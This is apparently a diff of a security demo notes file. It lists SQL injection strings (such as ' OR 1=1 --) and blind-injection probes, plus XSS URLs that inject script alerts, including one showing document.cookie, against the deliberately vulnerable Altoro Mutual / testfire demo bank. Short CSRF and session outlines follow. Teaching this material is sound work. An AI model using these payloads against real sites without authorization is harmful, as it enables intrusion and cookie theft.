@@ -1,21 +1,38 @@
 #### Demo-1: SQL-Injection Payloads
 
+abc
+abc'
+abc' AND 1=1 --
 abc' OR 1=1 --
-abc' OR 1 = 1
+jsmith' OR 1=0 --
 
+
+#### Demo-1: Blind SQL-Injection Payloads
+
+AND 1=0
+OR 1=1
+OR accountid=1001160180
 AND substring(@@version, 1, 1)=5
 
-OR accountid=1001160180
-OR 1=1
 
-### CSRF ####
+#### Demo-2: CSRF attack
 
-###XSS####
-<svg onerror=javascript:alert(1)></svg>
-
-http://demo.testfire.net/search.aspx?txtSearch=<script>alert(1)</script>
-
-http://demo.testfire.net/survey_complete.aspx?txtEmail=<script>alert(1)</script>
+1.Account Transaction
+2.Show accounts
 
 
-###Session####
+#### Demo-3: XSS attack
+
+http://www.altoromutual.com/search.aspx?txtSearch=<script>alert('XSS')</script>
+http://www.altoromutual.com/search.aspx?txtSearch=<script>alert(document.cookie)</script>
+http://www.altoromutual.com/search.aspx?txtSearch=<script>alert(document.domain)</script>
+http://www.altoromutual.com/search.aspx?txtSearch=<script>alert(document.origin)</script>
+
+
+http://www.altoromutual.com/survey_complete.aspx?txtEmail=<script>alert('XSS')</script>
+
+
+#### Demo-4: Session
+
+1.httpOnly cookie
+2.Gmail cookies 
